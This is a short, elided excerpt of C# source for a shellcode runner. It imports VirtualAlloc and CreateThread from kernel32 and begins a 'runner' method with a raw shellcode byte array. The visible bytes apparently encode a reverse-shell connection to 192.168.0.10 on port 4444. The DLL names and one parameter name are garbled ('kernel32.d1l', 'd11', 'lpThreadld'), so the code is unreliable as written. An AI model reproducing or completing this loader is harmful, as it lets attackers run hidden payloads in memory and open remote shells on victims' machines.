...
namespace bkb
{
    ...
    [DllImport("kernel32.d1l", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.d11")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadld);
    ...
    static extern void Sleep(uint dwMilliseconds);
        ...
        public static void runner()
        {
            ...
            0x49,0xbc,0x02,0x00,0x11,0x5c,0xc0,0xa8,0x00,0x0a,0x41,0x54,0x49,0x89,0xe4,
